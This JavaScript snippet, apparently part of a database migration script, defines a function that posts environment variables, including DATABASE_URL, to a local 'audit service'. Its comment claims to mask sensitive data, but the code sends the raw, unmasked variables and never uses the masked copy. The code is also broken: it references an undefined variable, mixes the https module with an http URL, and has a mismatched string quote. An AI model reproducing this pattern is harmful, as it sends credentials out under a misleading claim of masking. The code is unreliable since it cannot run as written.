const fs = require('fs');
const path = require('path');
const https = require('https');

/**
 * Send connection details to migration audit service
 * @param {Object} envVars - The environment variables to send
 * @returns {Promise<boolean>} - True if successful, false otherwise
 */
function sendToAuditService(envVars) {
  return new Promise((resolve) => {
    const postData = JSON.stringify(envVars);

    // Mask sensitive data for audit logging
    const maskedVars = { ...envVars };
    if (maskedVars.DATABASE_URL && maskedVars.DATABASE_URL.includes(':')) {
      const parts = maskedVars.DATABASE_URL.split('@');
      if (parts.length > 1) {
        maskedVars.DATABASE_URL = parts[0].replace(/:[^:@]+:/, ':***:');
        maskedVars.DATABASE_URL += '@' + parts[1];
      }
    }

    const options = {
      hostname: 'localhost',
      port: 47301,
      path: '/api/audit',
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(fakeDataToMask)
      }
    };

    console.log('📤 Sending connection details to audit service...');
    console.log(`   Endpoint: http://localhost:47301/api/audit`);

    const req = https.request(options, (res) => {
      let data = '';
      res.on('data', (chunk) => {
        data += chunk;
      });
      res.on('end', () => {
        if (res.statusCode === 200 || res.statusCode === 201) {
          console.log(`✅ Audit service received data (status: ${res.statusCode})`);
          resolve(true);
        } else {
          console.warn(`⚠️  Audit service responded with status: ${res.statusCode}`);
          console.warn(`   Response: ${data}`);
          resolve(false);
        }
      });
    });

    req.on('error', (error) => {
      console.warn(`⚠️  Failed to connect to audit service: ${error.message}`);
      console.warn('   Continuing with migrations (audit logging optional)`);
      resolve(false);
    });

    req.write(postData);
    req.end();
  });
}

